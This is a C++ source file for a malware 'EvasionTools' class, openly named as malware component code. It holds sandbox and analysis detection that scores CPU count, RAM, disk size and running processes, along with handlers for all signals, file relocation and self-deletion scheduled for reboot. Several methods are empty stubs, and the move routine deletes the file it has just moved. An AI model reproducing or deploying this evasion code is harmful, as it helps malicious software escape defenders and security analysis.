class EvasionTools{
	private:
		HANDLE fh;
		char* tmp	=	NULL;
		int 		RiskOfDetection=0;
	public:
		static void ChangePID(int _s=0){
			return;
		}
		void HandleAllSignals(function Handle){
			for (int tmp=1; tmp<=64; tmp++)
				signal(tmp, Handle);
		}
		void HandleSignal(int signl, function Handle){
			signal(signl, Handle);
		}
		int MoveMalware(const char* newpath){
			if (MoveFile(Current.name, newpath)){
				strncpy(Current.name, newpath, PAMAX);

				DeleteFile(newpath);

				MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				return 0;
			}
			return 1;
		}
		int MoveIntoMemory(){
			return 1;
		}
		int MoveBackToDisk(const char* loc=Current.name){
			return 1;
		}

		int SelfDestroy(){
			MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
			    return 0;
		}
		int CheckDynamicAnalysis(){

			SYSTEM_INFO CStat;
			MEMORYSTATUSEX MStat;
			GetSystemInfo(&CStat);
			MStat.dwLength = sizeof(MStat);
			GlobalMemoryStatusEx(&MStat);
			HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
			DISK_GEOMETRY pDiskGeometry;
			DWORD bytesReturned;
			DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
			DWORD diskSizeGB;
			diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
			DWORD runningProcessesIDs[1024];
			DWORD runningProcessesCountBytes;
			DWORD runningProcessesCount;
			EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
			runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
			RiskOfDetection = 0;
			if ( CStat.dwNumberOfProcessors < 2 )       RiskOfDetection++;
			if ( (MStat.ullTotalPhys/1024/1024) < 2048) RiskOfDetection++;
			if ( diskSizeGB < 100 )                     RiskOfDetection++;
			if (runningProcessesCount < 50)             RiskOfDetection++;


			return RiskOfDetection;
		}
};

